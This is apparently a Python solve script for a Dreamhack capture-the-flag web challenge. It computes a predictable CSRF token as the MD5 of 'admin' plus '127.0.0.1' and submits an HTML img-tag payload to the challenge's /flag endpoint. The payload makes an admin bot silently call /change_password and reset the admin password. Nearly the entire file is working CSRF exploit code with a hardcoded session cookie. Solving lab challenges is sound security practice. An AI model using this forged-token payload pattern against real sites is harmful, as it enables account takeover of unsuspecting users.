import requests
from hashlib import md5

BASE_URL = "http://host3.dreamhack.games:23829/"

# http://host3.dreamhack.games:23829//change_password
def change_password(csrfToken, pw):
    # GET csrftoken, pw
    session_id = "f827f0be6c137d3f"
    res = requests.get(
        f"{BASE_URL}change_password?csrfToken={csrfToken}&pw={pw}",
        cookies={"sessionid": session_id},
    )
    print(f"{res.status_code} {res.text}")
    print(f"{res.status_code} {res.headers}")

def flag(payload):
    # /flag
    data = {
        "param": payload
    }
    res = requests.post(f"{BASE_URL}flag", data=data)
    print(f"{res.status_code} {res.text}")
    print(f"{res.status_code} {res.headers}")

if __name__ == "__main__":
    csrfToken = md5(("admin"+"127.0.0.1").encode()).hexdigest()
    pw = "admin"
    # change_password(csrfToken, pw)
    payload = f'''<img src="/change_password?pw=admin&csrftoken={csrfToken}">'''
    print(payload)
    flag(payload)
